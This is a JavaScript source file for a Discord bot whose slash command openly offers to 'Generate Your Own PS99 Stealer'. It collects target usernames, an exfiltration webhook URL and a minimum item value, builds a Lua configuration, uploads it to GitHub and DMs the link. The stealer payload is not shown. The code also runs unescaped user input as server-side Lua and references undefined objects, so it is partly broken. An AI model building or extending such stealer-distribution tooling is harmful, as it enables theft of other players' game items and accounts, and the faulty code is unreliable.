import express from "express";
import { lua, to_jsstring } from "fengari";
import "dotenv/config";
import fs from "fs";
import { exec } from "child_process";
import { Octokit } from "@octokit/rest";
import {
    Client,
    GatewayIntentBits,
    SlashCommandBuilder,
    REST,
    Routes,
    ActionRowBuilder,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder,
} from "discord.js";
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const { load } = require('fengari-interop');
// Express server setup
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (_, res) => res.send('<center><h1>Bot 24H ON!</h1></center>'));
app.get('/health', (_, res) => res.status(200).send('OK'));

// Discord bot setup
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages, GatewayIntentBits.MessageContent],
    partials: ["CHANNEL"],
});

const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
const repoOwner = process.env.GITHUB_OWNER;
const repoName = process.env.GITHUB_REPO;
const repoPath = "scripts/";

const commands = [
    new SlashCommandBuilder()
        .setName("generate-ps99stealer")
        .setDescription("Generate Your Own PS99 Stealer!"),
].map(command => command.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);

client.once("ready", async () => {
    try {
        console.log(`✅ Logged in as ${client.user.tag}`);
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log("✅ Slash commands registered!");
    } catch (error) {
        console.error("❌ Error:", error);
    }
});

client.on("interactionCreate", async (interaction) => {
    if (!interaction.isCommand() && !interaction.isModalSubmit()) return;
    try {
        if (interaction.commandName === "generate-ps99stealer") {
            const modal = new ModalBuilder().setCustomId("form_pet_sim_99").setTitle("Generate PS99 Mailstealer");
            const fields = [
                { id: "username", label: "Username" },
                { id: "username_sec", label: "Second Username" },
                { id: "webhook", label: "Webhook URL" },
                { id: "rap", label: "Minimum Rap" }
            ];
            modal.addComponents(...fields.map(f => new ActionRowBuilder().addComponents(
                new TextInputBuilder().setCustomId(f.id).setLabel(f.label).setStyle(TextInputStyle.Short).setRequired(true)
            )));
            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit()) {
            await interaction.deferReply({ flags: 64 });
            const inputs = {
                username: interaction.fields.getTextInputValue("username"),
                username_sec: interaction.fields.getTextInputValue("username_sec"),
                webhook: interaction.fields.getTextInputValue("webhook"),
                rap: interaction.fields.getTextInputValue("rap"),
            };

            const timestamp = Date.now();
            const outputFileName = `Huge_Hunter_${timestamp}.txt`;
            const luaScript = `
                _G.Username = "${inputs.username}"
                _G.Username2 = "${inputs.username_sec}"
                _G.minrap = ${inputs.rap}
                _G.webhook = "${inputs.webhook}"
            `;

            try {
                const luaFunction = fengariInterop.load(luaScript);
                luaFunction();
                const output = to_jsstring(lua.lua_tostring(lua.L, -1));
                fs.writeFileSync(outputFileName, output);
                console.log(`✅ Lua script executed and saved to ${outputFileName}`);
            } catch (error) {
                console.error(`Execution error: ${error.message}`);
                return interaction.followUp({ content: "❌ Lua execution failed!", flags: 64 });
            }

            try {
                await octokit.repos.createOrUpdateFileContents({
                    owner: repoOwner, repo: repoName, path: `${repoPath}${outputFileName}`,
                    message: `Upload execution output: ${outputFileName}`,
                    content: Buffer.from(fs.readFileSync(outputFileName)).toString("base64"),
                    committer: { name: "Bot", email: "bot@example.com" },
                    author: { name: "Bot", email: "bot@example.com" },
                });

                const scriptURL = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${repoPath}${outputFileName}`;
                await interaction.user.send({ content: `✅ Your script is ready: ${scriptURL}` });
                console.log(`📩 Script URL sent to user: ${scriptURL}`);
                await interaction.followUp({ content: "✅ Check your DMs!", flags: 64 });
            } catch (uploadError) {
                console.error("❌ GitHub Upload Error:", uploadError);
                await interaction.followUp({ content: "❌ Failed to upload script!", flags: 64 });
            }
        }
    } catch (error) {
        console.error("❌ Error:", error);
        await interaction.followUp({ content: "❌ An error occurred!", flags: 64 });
    }
});

// Start Express server and Discord bot
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Express server running on port ${PORT}`);
    client.login(process.env.TOKEN).then(() => console.log('✅ Discord bot is live!')).catch(console.error);
});
